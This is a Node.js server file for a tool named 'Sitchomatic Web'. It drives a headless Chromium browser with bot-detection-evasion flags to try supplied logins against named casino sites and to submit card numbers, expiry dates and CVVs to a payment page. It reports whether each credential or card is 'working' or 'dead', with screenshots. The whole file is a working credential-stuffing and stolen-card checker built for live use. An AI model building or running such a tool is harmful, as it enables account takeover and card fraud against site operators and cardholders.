/**
 * @fileoverview Sitchomatic Web — Real Browser Automation Server v1.2
 *
 * Express + Playwright server that performs LIVE browser automation.
 * Serves the webapp static files on port 8791 and provides a REST API
 * on the same port under /api/... for real credential and card checks.
 *
 * Each check opens a real headless Chromium browser, navigates to the
 * target site, fills the form, submits, and captures 4 real screenshots
 * of the actual browser window at each key moment.
 *
 * API endpoints:
 *   POST /api/login-check   — Joe Fortune or Ignition login attempt
 *   POST /api/card-check    — PPSR card check
 *   GET  /api/status        — Server health check
 */

import express from 'express';
import { chromium } from 'playwright';
import path from 'path';
import { fileURLToPath } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();
app.use(express.json());

// Serve the webapp static files
app.use(express.static(path.join(__dirname, 'webapp')));

// ── Constants ────────────────────────────────────────────────────────────────

/** Port the server listens on. */
const PORT = 8791;

/**
 * Browser launch options for all automation contexts.
 * Uses Chromium headless with stealth-style args to reduce bot detection.
 */
const BROWSER_ARGS = [
  '--no-sandbox',
  '--disable-setuid-sandbox',
  '--disable-blink-features=AutomationControlled',
  '--disable-infobars',
  '--window-size=1280,800',
];

/** Default page navigation timeout in milliseconds. */
const NAV_TIMEOUT = 30000;

/** How long to wait after submitting a form before taking a screenshot. */
const POST_SUBMIT_WAIT = 3000;

// ── Helpers ──────────────────────────────────────────────────────────────────

/**
 * Captures a full-page screenshot from a Playwright page and returns it as
 * a base64-encoded PNG data URL suitable for embedding in <img> src attributes.
 * @param {import('playwright').Page} page - The Playwright page to capture.
 * @returns {Promise<string>} Data URL string (data:image/png;base64,...).
 */
async function captureShot(page) {
  try {
    const buf = await page.screenshot({ fullPage: false, type: 'png' });
    return `data:image/png;base64,${buf.toString('base64')}`;
  } catch {
    return '';
  }
}

/**
 * Attempts to fill a login form on the given page by trying a set of common
 * CSS selectors for email/username and password fields.
 * @param {import('playwright').Page} page - The Playwright page.
 * @param {string} username - Username or email to fill in.
 * @param {string} password - Password to fill in.
 * @returns {Promise<boolean>} True if both fields were found and filled.
 */
async function fillLoginForm(page, username, password) {
  const emailSelectors = [
    'input[type="email"]',
    'input[name="email"]',
    'input[name="username"]',
    'input[name="login"]',
    'input[placeholder*="email" i]',
    'input[placeholder*="username" i]',
    'input[id*="email" i]',
    'input[id*="user" i]',
    'input[id*="login" i]',
    'input[type="text"]:first-of-type',
  ];
  const passSelectors = [
    'input[type="password"]',
    'input[name="password"]',
    'input[name="pass"]',
    'input[placeholder*="password" i]',
    'input[id*="password" i]',
    'input[id*="pass" i]',
  ];

  let emailFilled = false;
  for (const sel of emailSelectors) {
    try {
      const el = page.locator(sel).first();
      if (await el.count() > 0 && await el.isVisible()) {
        await el.fill(username);
        emailFilled = true;
        break;
      }
    } catch {}
  }

  let passFilled = false;
  for (const sel of passSelectors) {
    try {
      const el = page.locator(sel).first();
      if (await el.count() > 0 && await el.isVisible()) {
        await el.fill(password);
        passFilled = true;
        break;
      }
    } catch {}
  }

  return emailFilled && passFilled;
}

/**
 * Clicks the login/submit button on a login form by trying common selectors.
 * @param {import('playwright').Page} page - The Playwright page.
 * @returns {Promise<boolean>} True if a submit button was found and clicked.
 */
async function clickSubmit(page) {
  const submitSelectors = [
    'button[type="submit"]',
    'input[type="submit"]',
    'button:has-text("Log in")',
    'button:has-text("Login")',
    'button:has-text("Sign in")',
    'button:has-text("Sign In")',
    'button:has-text("Submit")',
    '[data-testid*="submit" i]',
    '[data-testid*="login" i]',
    '.login-btn',
    '.btn-login',
    '.submit-btn',
  ];
  for (const sel of submitSelectors) {
    try {
      const el = page.locator(sel).first();
      if (await el.count() > 0 && await el.isVisible()) {
        await el.click();
        return true;
      }
    } catch {}
  }
  return false;
}

/**
 * Analyses the page content after a login attempt to determine the outcome.
 * Looks for success indicators (dashboard, account, logged-in elements) and
 * failure indicators (error messages, disabled account notices).
 * @param {import('playwright').Page} page - The Playwright page after form submission.
 * @param {string} loginUrl - The original login URL (used for redirect comparison).
 * @returns {Promise<{outcome: string, note: string}>} Outcome code and human-readable note.
 */
async function determineLoginOutcome(page, loginUrl) {
  const url = page.url();
  const bodyText = (await page.textContent('body').catch(() => '')).toLowerCase();

  // Check for success indicators
  const successPatterns = [
    /dashboard/i, /my.?account/i, /welcome/i, /deposit/i, /withdraw/i,
    /lobby/i, /cashier/i, /balance/i, /logged.?in/i, /profile/i,
  ];
  const isRedirected = !url.includes(new URL(loginUrl).hostname) || url !== loginUrl;
  const hasSuccessText = successPatterns.some(p => p.test(bodyText));

  if (isRedirected || hasSuccessText) {
    return { outcome: 'working', note: 'Login successful — redirected to account area' };
  }

  // Check for specific failure reasons
  if (/account.*disabled|disabled.*account|account.*suspended|suspended/i.test(bodyText)) {
    return { outcome: 'permDisabled', note: 'Account is permanently disabled or suspended' };
  }
  if (/temporarily.*blocked|too many.*attempt|locked.*out|try again later/i.test(bodyText)) {
    return { outcome: 'tempDisabled', note: 'Account temporarily locked — too many attempts' };
  }
  if (/email.*not.*found|account.*not.*found|user.*not.*found|no account/i.test(bodyText)) {
    return { outcome: 'noAcc', note: 'No account found for this email' };
  }
  if (/invalid.*password|incorrect.*password|wrong.*password|password.*incorrect/i.test(bodyText)) {
    return { outcome: 'noAcc', note: 'Invalid password' };
  }
  if (/invalid.*credentials|incorrect.*credentials|login.*failed|sign.?in.*failed/i.test(bodyText)) {
    return { outcome: 'noAcc', note: 'Invalid credentials' };
  }
  if (/error|invalid|incorrect|failed/i.test(bodyText)) {
    return { outcome: 'noAcc', note: 'Login failed — credentials rejected' };
  }

  return { outcome: 'noAcc', note: 'Login did not succeed — page unchanged' };
}

/**
 * Attempts to fill a card payment form on a page by trying common credit card
 * field selectors. Returns true if the card number field was found and filled.
 * @param {import('playwright').Page} page - The Playwright page.
 * @param {string} number - Card number.
 * @param {string} mm - Expiry month (2 digits).
 * @param {string} yy - Expiry year (2 digits).
 * @param {string} cvv - CVV/CVC code.
 * @returns {Promise<boolean>} True if the card number field was located and filled.
 */
async function fillCardForm(page, number, mm, yy, cvv) {
  const cardNumSelectors = [
    'input[name*="card" i][name*="number" i]',
    'input[id*="card" i][id*="number" i]',
    'input[placeholder*="card number" i]',
    'input[placeholder*="card no" i]',
    'input[data-testid*="card" i]',
    'input[autocomplete="cc-number"]',
    'input[name="cardNumber"]',
    'input[name="card_number"]',
    'input[name="number"]',
  ];
  const expirySelectors = [
    'input[autocomplete="cc-exp"]',
    'input[name*="expiry" i]',
    'input[name*="expiration" i]',
    'input[placeholder*="MM/YY" i]',
    'input[placeholder*="expiry" i]',
  ];
  const cvvSelectors = [
    'input[autocomplete="cc-csc"]',
    'input[name*="cvv" i]',
    'input[name*="cvc" i]',
    'input[name*="csc" i]',
    'input[placeholder*="cvv" i]',
    'input[placeholder*="cvc" i]',
    'input[placeholder*="security code" i]',
  ];

  let cardFilled = false;
  for (const sel of cardNumSelectors) {
    try {
      const el = page.locator(sel).first();
      if (await el.count() > 0 && await el.isVisible()) {
        await el.fill(number);
        cardFilled = true;
        break;
      }
    } catch {}
  }

  // Try combined expiry field (MM/YY)
  for (const sel of expirySelectors) {
    try {
      const el = page.locator(sel).first();
      if (await el.count() > 0 && await el.isVisible()) {
        await el.fill(`${mm}/${yy}`);
        break;
      }
    } catch {}
  }

  // Try separate month/year fields
  try {
    const mmEl = page.locator('select[name*="month" i], input[name*="month" i]').first();
    if (await mmEl.count() > 0) await mmEl.fill(mm);
    const yyEl = page.locator('select[name*="year" i], input[name*="year" i]').first();
    if (await yyEl.count() > 0) await yyEl.fill(`20${yy}`);
  } catch {}

  for (const sel of cvvSelectors) {
    try {
      const el = page.locator(sel).first();
      if (await el.count() > 0 && await el.isVisible()) {
        await el.fill(cvv);
        break;
      }
    } catch {}
  }

  return cardFilled;
}

/**
 * Analyses page content after a card check to determine the result.
 * @param {import('playwright').Page} page - The Playwright page after submission.
 * @returns {Promise<{outcome: string, note: string}>} Outcome and note.
 */
async function determineCardOutcome(page) {
  const bodyText = (await page.textContent('body').catch(() => '')).toLowerCase();

  if (/declined|do not honor|insufficient funds|card.*not.*accepted|payment.*failed/i.test(bodyText)) {
    return { outcome: 'dead', note: 'Card declined by payment processor' };
  }
  if (/approved|success|payment.*complete|transaction.*approved|authorised/i.test(bodyText)) {
    return { outcome: 'working', note: 'Card approved' };
  }
  if (/invalid.*card|card.*invalid|card.*number.*invalid/i.test(bodyText)) {
    return { outcome: 'dead', note: 'Invalid card number' };
  }
  if (/expired/i.test(bodyText)) {
    return { outcome: 'dead', note: 'Card expired' };
  }
  if (/error/i.test(bodyText)) {
    return { outcome: 'dead', note: 'Error during card check' };
  }

  return { outcome: 'dead', note: 'No clear result — check screenshots' };
}

// ── API: Status ──────────────────────────────────────────────────────────────

/**
 * GET /api/status
 * Returns server health status so the webapp can detect if the automation
 * backend is available before starting a run.
 */
app.get('/api/status', (req, res) => {
  res.json({ ok: true, version: '1.2.0', mode: 'live' });
});

// ── API: Login Check ─────────────────────────────────────────────────────────

/**
 * POST /api/login-check
 * Performs a real Playwright login attempt against the target casino site.
 * Takes 4 real browser screenshots at key moments during the attempt.
 *
 * Request body:
 *   site       {string} 'joe' | 'ign' — which casino
 *   username   {string} email/username
 *   password   {string} password
 *   loginUrl   {string} URL of the login page
 *   timeout    {number} optional page timeout ms (default 30000)
 *
 * Response:
 *   outcome    {string} 'working' | 'noAcc' | 'permDisabled' | 'tempDisabled'
 *   note       {string} human-readable result description
 *   shots      {string[]} array of 4 base64 PNG data URLs (real browser screenshots)
 *     [0] form filled before submit
 *     [1] first response after clicking submit
 *     [2] after page has settled (~3 seconds)
 *     [3] final state with outcome determined
 */
app.post('/api/login-check', async (req, res) => {
  const { username, password, loginUrl, timeout = NAV_TIMEOUT } = req.body;
  if (!username || !password || !loginUrl) {
    return res.status(400).json({ error: 'Missing username, password, or loginUrl' });
  }

  let browser;
  const shots = ['', '', '', ''];
  let outcome = 'noAcc';
  let note = 'Check did not complete';

  try {
    browser = await chromium.launch({ headless: true, args: BROWSER_ARGS });
    const context = await browser.newContext({
      viewport: { width: 1280, height: 800 },
      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    });
    const page = await context.newPage();
    page.setDefaultTimeout(timeout);

    // Navigate to login page
    await page.goto(loginUrl, { waitUntil: 'domcontentloaded', timeout });
    await page.waitForTimeout(2000);

    // Fill the login form
    const filled = await fillLoginForm(page, username, password);
    if (!filled) {
      note = 'Could not find login form fields on page';
    }

    // Shot 1: form filled, ready to submit
    shots[0] = await captureShot(page);

    // Click submit
    const clicked = await clickSubmit(page);
    if (!clicked && filled) {
      // Try pressing Enter if no submit button found
      await page.keyboard.press('Enter');
    }

    // Shot 2: immediately after submit (first response)
    await page.waitForTimeout(1500);
    shots[1] = await captureShot(page);

    // Wait for page to settle
    try {
      await page.waitForLoadState('networkidle', { timeout: POST_SUBMIT_WAIT });
    } catch {
      // Network may never be idle on SPAs — continue anyway
    }
    await page.waitForTimeout(1500);

    // Shot 3: after page settled
    shots[2] = await captureShot(page);

    // Determine outcome
    const result = await determineLoginOutcome(page, loginUrl);
    outcome = result.outcome;
    note = result.note;

    // Shot 4: final state
    shots[3] = await captureShot(page);

  } catch (err) {
    note = `Automation error: ${err.message}`;
    outcome = 'noAcc';
  } finally {
    if (browser) await browser.close().catch(() => {});
  }

  res.json({ outcome, note, shots });
});

// ── API: Card Check ───────────────────────────────────────────────────────────

/**
 * POST /api/card-check
 * Performs a real Playwright card check against the configured PPSR/payment URL.
 * Takes 4 real browser screenshots at key moments.
 *
 * Request body:
 *   number     {string} card number digits
 *   mm         {string} expiry month (2-digit)
 *   yy         {string} expiry year (2-digit)
 *   cvv        {string} CVV/CVC code
 *   ppsrUrl    {string} URL of the card check page
 *   timeout    {number} optional page timeout ms (default 30000)
 *
 * Response:
 *   outcome    {string} 'working' | 'dead'
 *   note       {string} human-readable result description
 *   shots      {string[]} array of 4 base64 PNG data URLs
 *     [0] page loaded, form visible
 *     [1] form filled with card details
 *     [2] first response after submit
 *     [3] final result state
 */
app.post('/api/card-check', async (req, res) => {
  const { number, mm, yy, cvv, ppsrUrl, timeout = NAV_TIMEOUT } = req.body;
  if (!number || !mm || !yy || !cvv || !ppsrUrl) {
    return res.status(400).json({ error: 'Missing card fields or ppsrUrl' });
  }

  let browser;
  const shots = ['', '', '', ''];
  let outcome = 'dead';
  let note = 'Check did not complete';

  try {
    browser = await chromium.launch({ headless: true, args: BROWSER_ARGS });
    const context = await browser.newContext({
      viewport: { width: 1280, height: 800 },
      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    });
    const page = await context.newPage();
    page.setDefaultTimeout(timeout);

    // Navigate to check page
    await page.goto(ppsrUrl, { waitUntil: 'domcontentloaded', timeout });
    await page.waitForTimeout(2000);

    // Shot 1: page loaded, form visible
    shots[0] = await captureShot(page);

    // Fill card form
    const filled = await fillCardForm(page, number, mm, yy, cvv);
    if (!filled) {
      note = 'Could not find card number field on page';
    }

    // Shot 2: form filled with card details
    shots[1] = await captureShot(page);

    // Submit
    const clicked = await clickSubmit(page);
    if (!clicked) {
      await page.keyboard.press('Enter');
    }

    // Wait for response
    await page.waitForTimeout(2000);
    try {
      await page.waitForLoadState('networkidle', { timeout: POST_SUBMIT_WAIT });
    } catch {}
    await page.waitForTimeout(1000);

    // Shot 3: first response after submit
    shots[2] = await captureShot(page);

    // Determine outcome
    const result = await determineCardOutcome(page);
    outcome = result.outcome;
    note = result.note;

    // Shot 4: final state
    shots[3] = await captureShot(page);

  } catch (err) {
    note = `Automation error: ${err.message}`;
    outcome = 'dead';
  } finally {
    if (browser) await browser.close().catch(() => {});
  }

  res.json({ outcome, note, shots });
});

// ── Start ─────────────────────────────────────────────────────────────────────

app.listen(PORT, () => {
  console.log(`Sitchomatic server running at http://localhost:${PORT}`);
  console.log(`  Webapp:  http://localhost:${PORT}/`);
  console.log(`  API:     http://localhost:${PORT}/api/status`);
  console.log(`  Mode:    LIVE browser automation (Playwright Chromium)`);
});
